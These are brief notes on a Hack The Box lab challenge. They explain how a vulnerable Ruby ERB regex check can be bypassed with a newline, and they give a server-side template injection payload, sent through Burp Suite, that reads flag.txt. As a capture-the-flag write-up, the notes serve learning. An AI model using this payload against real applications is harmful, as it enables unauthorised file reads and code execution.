
2024-09-21 18:51

Source: #htb 

Source Code Snippet - 
```ruby
if params[:neon] =~ /^[0-9a-z ]+$/i  
	@neon = ERB.new(params[:neon]).result(binding)  
else  
	@neon = "Malicious Input Detected"  
end
```

> And also, there is interesting situation. Even if you can use `%` in request , you can't use it in browser. you still will get “**Malicious Input Detected**” message.
> 
> But when you use it in **Burp suite** :
> You will see that we get “**Invalid query parameters: invalid %-encoding (a %)**” message.  
> It means something is wrong in our encoding but it still allows to send `%`

We send the request in burp w payload (url encode this)-  
```ruby
a  
<%= File.open('flag.txt').read %>
```
Yes, I passed to new line . Why ?
And If we want to run this code ,

```
<%= File.open('flag.txt').read %>
```

we have to pass new line like this :

```
<h1 class="glow"><%= @neon  
<%= File.open('flag.txt').read %>%></h1>
```

And we cant leave `@neon` empty , that's why I write it like :

```
<h1 class="glow"><%= a  
<%= File.open('flag.txt').read %>%></h1>
```

We need to use new line, but we cant use /n




### References

SSTI for apps written in Ruby  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---retrieve-etcpasswd

https://medium.com/@nurlanisazade/hack-the-box-neonify-walkthrough-guided-mode-cbd8d71962f9